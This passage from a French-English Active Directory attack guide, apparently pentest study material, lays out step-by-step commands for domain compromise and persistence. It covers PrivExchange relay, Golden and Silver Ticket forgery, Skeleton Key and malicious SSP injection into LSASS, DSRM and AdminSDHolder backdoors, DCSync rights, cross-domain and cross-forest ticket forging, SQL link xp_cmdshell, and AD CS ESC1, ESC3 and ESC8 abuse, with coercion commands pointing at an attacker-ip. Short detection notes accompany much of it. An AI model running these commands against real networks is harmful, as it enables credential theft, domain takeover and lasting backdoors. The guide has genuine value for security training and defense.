impacket-psexec -k -no-pass domain/Administrator@TARGET.domain.local
```

**Cleanup**:
```powershell
# Remove RBCD configuration
Get-DomainComputer TARGET | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'

# Delete computer account
Remove-MachineAccount -MachineAccount FAKE01
```

#### OPSEC

- 🟢 Modern technique
- 🟢 Less monitored than traditional delegation
- ⚠️ Computer account creation logged (Event 4741)
- ⚠️ Object modification (Event 5136)

---

### 4.6 MS Exchange PrivExchange

#### Concept

**Exchange Permissions**:
- By default, Exchange Servers = high privileges dans AD
- Exchange Windows Permissions group → WriteDACL sur domain object
- Can add DCSync rights to ANY user

**CVE-2019-0686 (PrivExchange)**:
- Exchange SSRF vulnerability
- Coerce Exchange server auth via NTLM
- Relay to LDAP
- Add DCSync rights
- DCSync domain

#### Requirements
- Exchange Server accessible
- NTLM relay possible (SMB signing not required)
- Ability to trigger HTTP request from Exchange

#### Exploitation

**Setup ntlmrelayx**:
```bash
# Relay to LDAP, escalate privileges
impacket-ntlmrelayx -t ldap://dc.domain.local --escalate-user attacker

# OR delegate access
impacket-ntlmrelayx -t ldap://dc.domain.local --delegate-access
```

**Trigger PrivExchange** (https://github.com/dirkjanm/PrivExchange):
```bash
python3 privexchange.py -u attacker -p password -d domain.local -ah attacker-ip exchange.domain.local

# Exchange will auth to attacker-ip
# ntlmrelayx relays to LDAP
# Adds DCSync rights to attacker user
```

**DCSync**:
```powershell
# After escalation
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'

# Impacket
secretsdump.py domain/attacker:password@dc.domain.local
```

#### Mitigation

- Patch Exchange (>= March 2019)
- LDAP signing + channel binding
- Restrict Exchange permissions
- Separate Exchange servers security boundary

#### OPSEC

- 🔴 Detectable (unusual Exchange HTTP requests)
- 🔴 LDAP modifications logged (Event 5136)
- 🔴 DCSync rights addition = high severity alert

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## PHASE 5: Domain Persistence

### 5.1 Golden Ticket

#### Concept

**Golden Ticket** = Forged TGT (Ticket Granting Ticket) using KRBTGT account hash

**Caractéristiques**:
- Validité: Configurable (default 10 ans)
- Persiste après password resets
- Fonctionne même si KRBTGT password changé (jusqu'à 2x rotation)
- Permet impersonate ANY user (même inexistant)
- Accès à TOUS services du domain

**Requirements**:
- KRBTGT NTLM hash ou AES key
- Domain SID
- Domain name

#### Obtenir KRBTGT Hash

**DCSync** (méthode recommandée):
```powershell
# Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'

# Impacket
secretsdump.py domain/admin:password@dc.domain.local -just-dc-user krbtgt
```

**Dump NTDS.dit** (si accès DC):
```powershell
# Avec ntdsutil
ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q

# Parse avec secretsdump
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

#### Création Golden Ticket

**Mimikatz**:
```cmd
# Get domain info first
lsadump::dcsync /user:domain\krbtgt

# Create Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_NTLM_HASH /id:500 /ptt

# Options:
# /user: Username to impersonate (peut être fictif)
# /domain: Domain FQDN
# /sid: Domain SID (sans RID final)
# /krbtgt: KRBTGT NTLM hash
# /id: User RID (500 = Administrator)
# /groups: Group RIDs (default: 513,512,520,518,519)
# /ptt: Pass-the-ticket (inject direct)
# /ticket: Save to file instead
```

**Advanced Options**:
```cmd
# Specify validity
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Custom groups (Enterprise Admins, Domain Admins)
kerberos::golden /user:fakeuser /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /groups:519,512 /ptt

# AES key (better OPSEC)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /aes256:AES256KEY /ptt
```

**Impacket ticketer.py**:
```bash
# Create Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator

# Specify groups
impacket-ticketer -nthash HASH -domain-sid SID -domain domain.local -groups 512,513,518,519,520 Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc.domain.local
```

#### Utilisation

**Access ressources**:
```powershell
# After PTT, access ANY resource
dir \\dc.domain.local\C$
Enter-PSSession -ComputerName dc.domain.local

# Get TGS for specific service
klist  # Show TGT
# Request service access triggers TGS request
```

#### Detection

**Event IDs**:
- **4768**: TGT request (check unusual account names, lifetime)
- **4769**: TGS request (check TGT properties)
- **4624**: Logon (Type 3, check account anomalies)

**Indicators**:
- TGT lifetime > 10 hours (default = 10h)
- TGT for non-existent user
- TGT with unusual group memberships
- Encryption downgrade (RC4 when AES available)

**Mitigation**:
- Rotate KRBTGT password 2x (wait 10h between)
- Monitor Event 4768/4769 for anomalies
- Use MDI (Microsoft Defender for Identity)

---

### 5.2 Silver Ticket

#### Concept

**Silver Ticket** = Forged TGS (Service Ticket) using service account hash

**Différence vs Golden**:
- Silver = TGS (specific service), Golden = TGT (all services)
- Silver = requires service hash, Golden = requires KRBTGT hash
- Silver = moins détectable (pas de contact avec DC pour TGS)

**Scope**: Limited to specific service (CIFS, HTTP, LDAP, etc.)

#### Requirements

- Service account NTLM hash (computer or user)
- Domain SID
- Target SPN
- Username to impersonate

#### Service Hash Sources

**Computer Account Hash**:
```powershell
# DCSync computer account
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\DC01$"'

# From compromised computer (as SYSTEM)
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

**Service Account Hash**:
```powershell
# DCSync service account
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\sqlservice"'

# Kerberoast
Rubeus.exe kerberoast /user:sqlservice
```

#### Création Silver Ticket

**Mimikatz**:
```cmd
# CIFS service (file share access)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:dc.domain.local /service:cifs /rc4:COMPUTER_HASH /ptt

# HTTP service (web apps)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:HASH /ptt

# LDAP (DCSync-like access)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:dc.domain.local /service:ldap /rc4:DC_HASH /ptt
```

**Common Services**:
```cmd
# CIFS - File shares
/service:cifs

# HTTP - Web applications, PowerShell Remoting
/service:http

# HOST - Windows Remote Management, Scheduled Tasks
/service:host

# LDAP - Directory queries
/service:ldap

# RPCSS - WMI
/service:rpcss

# MSSQL - SQL Server
/service:mssqlsvc

# WSMAN - PowerShell Remoting
/service:wsman
```

**Impacket**:
```bash
# Create Silver Ticket
impacket-ticketer -nthash COMPUTER_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn cifs/dc.domain.local Administrator

# Use
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass domain.local/Administrator@dc.domain.local
```

#### Detection

**Indicators**:
- Service tickets without prior TGT request
- Service tickets for accounts that don't access that service
- Unusual PAC validation failures

**Less detectable than Golden**:
- No 4768 event (TGT request)
- Only 4769 (TGS request) - if logged

---

### 5.3 Skeleton Key

#### Concept

**Skeleton Key** = Malware injectée dans LSASS sur DC

**Fonctionnement**:
- Patch LSASS memory sur DC
- Ajoute "master password" qui fonctionne pour TOUS users
- Users peuvent toujours utiliser leur vrai password
- Skeleton key password = secondary password for all accounts

**Requirements**:
- Domain Admin ou accès DC
- Mimikatz sur DC

#### Installation

**Mimikatz**:
```cmd
# On Domain Controller (as DA)
privilege::debug
misc::skeleton

# Default password: "mimikatz"
```

**Custom Password**:
```powershell
# Recompile Mimikatz avec custom password ou
# Utiliser version modifiée
```

#### Utilisation

**Access ANY account**:
```powershell
# User normal password still works
# But skeleton key password aussi

# Access avec skeleton key
net use \\dc.domain.local\c$ /user:domain\anyuser mimikatz

# Mimikatz sur target
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'

# PSRemoting
Enter-PSSession -ComputerName dc.domain.local -Credential domain\anyuser
# Password: mimikatz
```

#### Persistence

**Non-persistent**:
- Reboot DC = skeleton key perdue
- Requiert re-injection après restart

**Solution**: Combine avec autre persistence (Golden Ticket backup)

#### Detection

**Event IDs**:
- **7045**: Service installation (si deployed as service)
- **4673**: Sensitive privilege use
- System events: Unusual LSASS access

**Indicators**:
- LSASS memory modified
- Multiple logon attempts with same password
- Success from unusual locations

**Mitigation**:
- Monitor LSASS integrity
- Use Protected Process Light (PPL) pour LSASS
- Alert on Event 7045 from DCs
- MDI detection

---

### 5.4 DSRM

#### Concept

**DSRM** = Directory Services Restore Mode

**Purpose légitime**: Recovery mode pour DC (AD repair, restoration)

**DSRM Admin**:
- Local administrator account sur DC
- Password défini lors dcpromo
- Par défaut: Can't login normally, only in DSRM boot
- Abuse: Changer config pour permettre normal logon

#### DSRM Password

**Locations**:
- Stored in SAM (pas dans AD)
- Hash extractable from DC registry

**Dump DSRM Hash**:
```powershell
# Mimikatz on DC
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Get DSRM admin hash
# Username: Administrator (local)
```

#### Enable DSRM Logon

**Registry Modification** (on DC):
```powershell
# Allow DSRM admin to logon normally
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Values:
# 0 (default) = DSRM admin can only logon when DC in DSRM mode
# 1 = DSRM admin can logon only when AD DS stopped
# 2 = DSRM admin can logon anytime (WANT THIS)
```

#### Exploitation

**Access DC**:
```powershell
# PTH with DSRM hash (local Administrator)
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:DSRM_HASH /run:powershell.exe"'

# Access DC
Enter-PSSession -ComputerName dc01

# Or use Impacket
impacket-psexec -hashes :DSRM_HASH ./Administrator@dc01
```

#### Detection

**Registry modification**:
- Monitor `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`
- Alert if value = 2

**Logon events**:
- Event 4624: Logon with local DC administrator
- Unusual for production DCs

---

### 5.5 Custom SSP

#### Concept

**SSP** = Security Support Provider

**Purpose**: Plugin pour Windows authentication

**Légitimes**: Kerberos, NTLM, Digest, etc.

**Malicious SSP**:
- Capture credentials pendant auth
- Log plaintext passwords
- Injected into LSASS

#### Mimikatz mimilib.dll

**Installation**:
```powershell
# Copy mimilib.dll to System32
Copy-Item mimilib.dll C:\Windows\System32\

# Register SSP
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages

# Reboot required
# OR inject without reboot:
Invoke-Mimikatz -Command '"misc::memssp"'
```

**Memory Injection** (no reboot):
```powershell
# Inject into LSASS (temporary, lost on reboot)
Invoke-Mimikatz -Command '"privilege::debug" "misc::memssp"'
```

#### Credential Capture

**Output location**:
```
C:\Windows\System32\kiwissp.log
```

**Format**:
```
[00000000] DOMAIN\user password123
[00000001] DOMAIN\admin SecureP@ss
```

#### Detection

**Registry**:
- Monitor `HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
- Alert on new SSP additions

**Files**:
- Monitor C:\Windows\System32 for suspicious DLLs
- Check kiwissp.log presence

**Events**:
- Event 4657: Registry value modified
- DLL load events (Sysmon Event 7)

---

### 5.6 AdminSDHolder

#### Concept

**AdminSDHolder**:
- Template ACL container
- Located: `CN=AdminSDHolder,CN=System,DC=domain,DC=local`
- Purpose: Protect high-privilege groups

**SDProp** (Security Descriptor Propagator):
- Runs every 60 minutes
- Overwrites ACLs of protected objects with AdminSDHolder ACL
- Protected groups: Domain Admins, Enterprise Admins, Schema Admins, etc.

**Attack**: Add backdoor ACL to AdminSDHolder → propagates to all DAs

#### Protected Groups

- Domain Admins
- Enterprise Admins
- Schema Admins
- Administrators
- Account Operators
- Backup Operators
- Print Operators
- Server Operators
- Domain Controllers
- Read-Only Domain Controllers
- Group Policy Creator Owners

#### Backdoor ACL

**Add GenericAll for user**:
```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All

# AD Module
$acl = Get-Acl "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=local"
$user = New-Object System.Security.Principal.NTAccount("domain\attacker")
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user, "GenericAll", "Allow")
$acl.AddAccessRule($ace)
Set-Acl -Path "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=local" -AclObject $acl
```

**Add DCSync rights**:
```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# This won't propagate via SDProp, manual backdoor
```

#### Exploitation

**Wait for SDProp** (60 min):
```powershell
# Check if ACL propagated
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match "attacker"}
```

**Force propagation** (if DA):
```powershell
# Invoke-SDPropagator (requires DA)
Invoke-SDPropagator -timeoutMinutes 1
```

**Use backdoor**:
```powershell
# Can now reset DA passwords, add users to DA group, etc.
Set-DomainUserPassword -Identity da_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

#### Detection

**Monitor AdminSDHolder**:
- Alert on ACL modifications: Event 5136
- Baseline AdminSDHolder ACL
- Check for unexpected trustees

**Audit protected groups**:
- Monitor ACL changes on Domain Admins, etc.
- Event 4662: Object access (ACL read)

---

### 5.7 DCSync Rights

#### Concept

**Alternative à AdminSDHolder**: Grant DCSync directly

**Rights required**:
- DS-Replication-Get-Changes (GUID: 1131f6aa-...)
- DS-Replication-Get-Changes-All (GUID: 1131f6ad-...)

**Target**: Domain object (DC=domain,DC=local)

#### Grant DCSync Rights

**PowerView**:
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

**Manual**:
```powershell
# Get domain DN
$domainDN = (Get-ADDomain).DistinguishedName

# Get user SID
$userSID = (Get-ADUser attacker).SID

# Create ACEs
$acl = Get-Acl "AD:\$domainDN"

$guid1 = [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
$guid2 = [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All

$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userSID, "ExtendedRight", "Allow", $guid1)
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userSID, "ExtendedRight", "Allow", $guid2)

$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)

Set-Acl -Path "AD:\$domainDN" -AclObject $acl
```

#### Exploitation

**DCSync**:
```powershell
# Now attacker can DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'

# Impacket
secretsdump.py domain/attacker:password@dc.domain.local
```

#### Detection

**Event 5136**: Directory object modified
- Check for replication rights additions
- Monitor domain object ACL

**Event 4662**: Object access
- DCSync attempts logged
- Filter for replication GUIDs

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## PHASE 6: Cross-Domain Attacks

### 6.1 AD CS Cross-Domain

#### Concept

**AD CS peut traverser trusts**:
- Enterprise CA = accessible de child domains
- Certificate templates disponibles cross-domain
- SAN peut spécifier users d'autres domains

#### Enumération Cross-Domain

**Certify**:
```powershell
# Enum child domain CA
Certify.exe cas /domain:child.domain.local

# Find vulnerable templates
Certify.exe find /vulnerable /domain:child.domain.local
```

**Certipy**:
```bash
# From Linux
certipy find -u 'user@child.domain.local' -p password -dc-ip dc.child.domain.local
```

#### Exploitation ESC1 Cross-Domain

```powershell
# Request cert from child domain with parent domain SAN
Certify.exe request /ca:CHILD-CA-01\CA /template:VulnTemplate /altname:Administrator@parent.domain.local

# Auth avec cert
Rubeus.exe asktgt /user:Administrator /domain:parent.domain.local /certificate:cert.pfx /password:password /ptt

# Now DA dans parent domain
```

---

### 6.2 Trust Tickets

#### Concept

**Trust Ticket** = Inter-Realm TGT

**Trust Key**:
- Shared secret entre domains
- Utilisé pour chiffrer trust tickets
- Stocké comme user account: `PARENT$` ou `CHILD$`

**Attack**: Forge trust ticket pour traverser trust

#### Enumération Trusts

**PowerView**:
```powershell
Get-DomainTrust
Get-DomainTrust -Domain parent.domain.local

# Detailed
Get-DomainTrustMapping
```

**AD Module**:
```powershell
Get-ADTrust -Filter *
```

#### Obtenir Trust Key

**DCSync**:
```powershell
# From child domain, DCSync trust account
Invoke-Mimikatz -Command '"lsadump::dcsync /user:child\parent$"'

# Trust key = RC4 hash
```

#### Forge Trust Ticket

**Mimikatz**:
```cmd
# Create inter-realm TGT
kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-PARENT-SID-519 /rc4:TRUST_KEY /service:krbtgt /target:parent.domain.local /ticket:trust.kirbi

# Options:
# /sids: SID History (519 = Enterprise Admins RID)
# /service:krbtgt (for inter-realm)
# /target: Parent domain
```

**Inject ticket**:
```powershell
Rubeus.exe ptt /ticket:trust.kirbi

# Request TGS in parent domain
Rubeus.exe asktgs /service:cifs/dc.parent.domain.local /domain:parent.domain.local /dc:dc.parent.domain.local /ptt

# Access parent DC
dir \\dc.parent.domain.local\C$
```

---

### 6.3 KRBTGT Method

#### Concept

**Direct KRBTGT abuse**: Use child KRBTGT pour accéder parent

**SID History injection**:
- Enterprise Admins SID: S-1-5-21-ROOT-DOMAIN-SID-519
- Add to ticket lors forge

#### Obtenir Child KRBTGT

```powershell
# DCSync from child
Invoke-Mimikatz -Command '"lsadump::dcsync /user:child\krbtgt"'
```

#### Obtenir Parent Domain SID

```powershell
# From child domain
Get-DomainSID -Domain parent.domain.local

# Construct EA SID
$parentSID = "S-1-5-21-xxx-xxx-xxx"
$eaSID = "$parentSID-519"  # Enterprise Admins
```

#### Forge Ticket avec SID History

```cmd
# Mimikatz
kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-PARENT-SID-519 /krbtgt:CHILD_KRBTGT_HASH /ptt

# Now access parent domain
dir \\dc.parent.domain.local\C$
```

**Impacket**:
```bash
impacket-ticketer -nthash CHILD_KRBTGT_HASH -domain child.domain.local -domain-sid S-1-5-21-CHILD-SID -extra-sid S-1-5-21-PARENT-SID-519 Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass -target-ip dc.parent.domain.local parent.domain.local/Administrator@dc.parent.domain.local
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## PHASE 7: Cross-Forest Attacks

### 7.1 SID Filtering

#### Concept

**SID Filtering** = Security protection

**Purpose**: Block SID History abuse across forest trust

**Default**:
- **Enabled** for forest trusts
- **Disabled** for parent-child (within forest)

**Check if enabled**:
```powershell
Get-ADTrust -Filter * | Select Name,SIDFilteringQuarantined
# True = SID Filtering enabled
# False = SID Filtering disabled (vulnerable)
```

#### When Disabled

**Rare scenarios**:
- Trust created before SID filtering existed
- Manually disabled pour migration purposes
- Misconfiguration

**Exploitation**:
```powershell
# If SID filtering disabled on forest trust
# Forge ticket avec SID history comme parent-child attack
kerberos::golden /user:Administrator /domain:child.forest1.local /sid:CHILD-SID /sids:S-1-5-21-FOREST2-SID-519 /krbtgt:HASH /ptt
```

---

### 7.2 Trust Abuse

#### Forest Trust Exploitation

**Requirements**:
- Compromise domain dans forest A
- Forest trust exists A ↔ B
- SID filtering disabled (rare) OR find autre path

**Attack Paths**:

1. **Shared Resources**:
```powershell
# Enumerate shared resources accessible via trust
Find-DomainShare -CheckShareAccess -Domain target-forest.local
```

2. **Foreign Security Principals**:
```powershell
# Users from forest A dans groups de forest B
Get-DomainForeignGroupMember -Domain target-forest.local
```

3. **SQL Server Links**:
```powershell
# SQL links can traverse forest trusts
Get-SQLServerLinkCrawl -Instance sql.forest1.local
```

---

### 7.3 Foreign Security Principals

#### Concept

**FSP** = Foreign Security Principal

**Usage légitime**:
- User from forest A added to group in forest B
- Represented as FSP object in forest B

**Attack**: Find FSP with high privileges

#### Enumération

**PowerView**:
```powershell
# Find foreign users in groups
Get-DomainForeignGroupMember

# Specific domain
Get-DomainForeignGroupMember -Domain target.forest.local

# Find which groups
Get-DomainForeignUser | Select-Object -ExpandProperty GroupMembership
```

**Exploitation**:
```powershell
# If compromised user from forest A est dans Domain Admins forest B
# Use credentials to access forest B
Enter-PSSession -ComputerName dc.target.forest.local -Credential forestA\compromised_user
```

---

### 7.4 SQL Server Links

#### Concept

**SQL Server Database Links**:
- Allow queries between SQL instances
- Can traverse trusts
- Execute as different security context

**Attack**: Crawl links to find path to DA

#### Enumération

**PowerUpSQL**:
```powershell
Import-Module PowerUpSQL

# Discover SQL instances
Get-SQLInstanceDomain

# Find links
Get-SQLServerLink -Instance sql01.domain.local

# Crawl all links
Get-SQLServerLinkCrawl -Instance sql01.domain.local
```

#### Exploitation

**Command Execution via Links**:
```powershell
# Execute on linked server
Get-SQLServerLinkCrawl -Instance sql01 -Query "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"

# Execute commands
Get-SQLServerLinkCrawl -Instance sql01 -Query "EXEC xp_cmdshell 'whoami'"
```

**Double-Hop Attack**:
```sql
-- From SQL01 → SQL02 → SQL03
-- Enable xp_cmdshell on final server
EXECUTE('EXECUTE(''sp_configure ''''xp_cmdshell'''',1;RECONFIGURE;'') AT "SQL02"') AT "SQL03"

-- Execute command
EXECUTE('EXECUTE(''xp_cmdshell ''''whoami'''''') AT "SQL02"') AT "SQL03"
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## PHASE 8: PAM Trust Abuse

### 8.1 Shadow Principals

#### Concept

**PAM** = Privileged Access Management

**Shadow Security Principals**:
- Objects dans bastion forest
- Represent high-privilege accounts from production forest
- Temporary elevation mechanism

**Trust Type**: PAM Trust (one-way from production to bastion)

#### Enumération

**PowerView**:
```powershell
# Check if PAM trust exists
Get-ADTrust -Filter {TrustAttributes -band 0x00000400}

# Enumerate shadow principals
Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local" -Filter *
```

#### Exploitation

**If compromise bastion forest**:
```powershell
# Shadow principals have SID history pointing to production DA groups
# Can use to access production forest

# Get shadow principal details
Get-ADObject -Identity "CN=ShadowDA,CN=Shadow Principal Configuration..." -Properties *

# Use SID history to access production
# Forge ticket avec SID history
```

**Attack Path**:
1. Compromise bastion forest (lower security)
2. Find shadow principals
3. Extract SID history (production forest SIDs)
4. Forge ticket with SID history
5. Access production forest as DA

[↑ Retour au sommaire](#-table-des-matières-complète)

---

# PART 2: AD CS ATTACKS

> **📖 Pour guide complet AD CS**: Voir [ADCS-Attacks-Complete-Guide.md](ADCS-Attacks-Complete-Guide.md) (2868 lignes, tous ESC1-11, THEFT, PERSIST)

## Module 0: Fondamentaux AD CS

### 0.1 Introduction AD CS

**Active Directory Certificate Services** = PKI Microsoft intégrée AD

**Rôle**: Emettre et gérer certificats X.509

**Usage**:
- Authentification (Smart Cards, Client Authentication)
- Signature code
- Encryption (EFS, Email)
- VPN, WiFi, SSL/TLS

### 0.2 Composants

**Certification Authority (CA)**:
- Enterprise CA: Intégrée AD, auto-enrollment
- Standalone CA: Non-intégrée

**Certificate Templates**:
- Définissent usage (EKU), permissions, validité

**Enrollment Methods**:
- Auto-enrollment (GPO)
- Web Enrollment (HTTP)
- Manual (certreq, MMC)

### 0.3 Formats Certificats

```
PEM     → Base64 (-----BEGIN CERTIFICATE-----)
DER     → Binary
PFX/P12 → Certificat + clé privée (password-protected)
P7B     → Chain (sans clé privée)
```

**Conversions**:
```bash
# PEM → PFX
openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem

# PFX → PEM
openssl pkcs12 -in cert.pfx -out cert.pem -nodes

# Certipy conversion auto
certipy auth -pfx cert.pfx
```

### 0.4 EKUs et OIDs

**Extended Key Usage critiques**:

| EKU | OID | Impact |
|-----|-----|--------|
| Client Authentication | 1.3.6.1.5.5.7.3.2 | **Kerberos auth** |
| Any Purpose | 2.5.29.37.0 | **Abuse ANY usage** |
| Certificate Request Agent | 1.3.6.1.4.1.311.20.2.1 | **On-behalf-of enrollment** |
| Code Signing | 1.3.6.1.5.5.7.3.3 | Sign malware |
| Server Authentication | 1.3.6.1.5.5.7.3.1 | SSL/TLS |

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## Module 1: Enumération AD CS

### 1.1 Certify

```powershell
# Find CAs
Certify.exe cas

# Find vulnerable templates
Certify.exe find /vulnerable

# Specific template
Certify.exe find /enrolleeSuppliesSubject
```

### 1.2 Certipy

```bash
# Enumerate tout
certipy find -u 'user@domain.local' -p password -vulnerable -stdout

# Output fichier
certipy find -u 'user@domain.local' -p password -vulnerable -bloodhound
```

### 1.3 Enumération Manuelle

```powershell
# List templates
certutil -v -template

# Template details
Get-ADObject -Filter * -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Properties *

# CA config
certutil -config "CA-SERVER\CA-NAME" -template
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## Module 2: ESC Techniques

### 2.1 ESC1 - SAN (⭐ PRIORITÉ #1)

**Condition**: Template avec `ENROLLEE_SUPPLIES_SUBJECT` + Client Auth EKU

**Attack**: Specify SAN → impersonate ANY user

**Certify**:
```powershell
# Request cert avec SAN
Certify.exe request /ca:CA-SERVER\CA /template:VulnTemplate /altname:Administrator@domain.local

# Convert PEM → PFX
cat cert.pem | openssl pkcs12 -export -out admin.pfx

# Auth
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt
```

**Certipy** (recommandé):
```bash
# Request + auth en une commande
certipy req -u 'user@domain.local' -p password -ca 'CA-SERVER' -template 'VulnTemplate' -upn 'administrator@domain.local'

# Auth (automatic conversion)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Get NTLM hash + TGT
```

**Défense**:
- Disable `ENROLLEE_SUPPLIES_SUBJECT`
- Enable Manager Approval
- Monitor Event 4886/4887 (SAN ≠ Subject)

---

### 2.3 ESC3 - Enrollment Agent (⭐ PRIORITÉ #2)

**Condition**: Template avec Certificate Request Agent EKU

**Attack**: Obtenir enrollment agent cert → request on-behalf-of ANY user

**Step 1: Get Enrollment Agent Cert**:
```powershell
Certify.exe request /ca:CA /template:EnrollmentAgent
```

**Step 2: Request on-behalf-of**:
```powershell
Certify.exe request /ca:CA /template:User /onbehalfof:domain\Administrator /enrollcert:agent.pfx /enrollcertpw:password
```

**Certipy**:
```bash
# Get agent cert
certipy req -u user@domain.local -p password -ca CA -template EnrollmentAgent

# Request on-behalf-of
certipy req -u user@domain.local -p password -ca CA -template User -on-behalf-of 'domain\Administrator' -pfx agent.pfx

# Auth
certipy auth -pfx administrator.pfx
```

---

### 2.8 ESC8 - NTLM Relay (⭐ PRIORITÉ #3)

**Condition**: Web Enrollment avec NTLM auth

**Attack**: NTLM relay → request cert → auth as computer

**Setup ntlmrelayx**:
```bash
# Relay to Web Enrollment
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# OR Certipy relay
certipy relay -target http://ca-server/certsrv/certfnsh.asp
```

**Coerce Authentication**:
```powershell
# PetitPotam
python3 PetitPotam.py attacker-ip dc.domain.local

# PrinterBug
SpoolSample.exe dc.domain.local attacker-ip

# Coercer (all methods)
Coercer coerce -l attacker-ip -t dc.domain.local
```

**Use Cert**:
```bash
# Certipy auth avec cert obtenu
certipy auth -pfx dc.pfx

# UnPAC the hash → NTLM hash DC
# Then DCSync
secretsdump.py -hashes :HASH 'domain/dc$@dc.domain.local'
```

**Défense** (KB5014754 - May 2022):
- Enable EPA (Extended Protection for Authentication)
- HTTPS only
- Certificate Mapping with SID

---

## Module 3: THEFT Techniques

### 3.5 THEFT5 - UnPAC the Hash (⭐ ESSENTIEL)

**Concept**: Certificate auth → récupérer NTLM hash via U2U

**Certipy** (automatique):
```bash
# Auth avec cert → get hash
certipy auth -pfx user.pfx -dc-ip 10.10.10.10

# Output:
# - NT Hash: abc123...
# - TGT saved

# Use hash
secretsdump.py -hashes :NT_HASH domain/user@dc.domain.local
```

**PKINITtools** (manuel):
```bash
# Step 1: Get TGT
python3 gettgtpkinit.py domain.local/user -cert-pfx user.pfx -dc-ip dc.domain.local user.ccache

# Step 2: Get NTLM hash via U2U
python3 getnthash.py domain.local/user -key AS-REP-KEY
```

**Rubeus**:
```powershell
# Request TGT + get credentials
Rubeus.exe asktgt /user:user /certificate:user.pfx /password:password /getcredentials
```

**Importance**: Fonctionne **après password reset** !

---

## Module 5: DPERSIST Techniques

### 5.1 DPERSIST1 - CA Private Key (🔴 GAME OVER)

**Concept**: Extract CA private key → forge ANY certificate

**Impact**: Persistence PERMANENTE jusqu'à CA rebuild complet

**Methods**:

**1. Backup CA via GUI** (si DA):
```
certlm.msc → CA Properties → Back up CA... → Include private key
```

**2. certutil** (si accès CA):
```cmd
certutil -backupKey C:\Temp\backup
certutil -backupKey -p password C:\Temp\backup
```

**3. DPAPI** (si compromised CA):
```powershell
SharpDPAPI.exe certificates /machine
```

**4. Export via registry**:
```cmd
reg save HKLM\SOFTWARE\Microsoft\Cryptography\Services ca.hive
```

**Use ForgeCert**:
```powershell
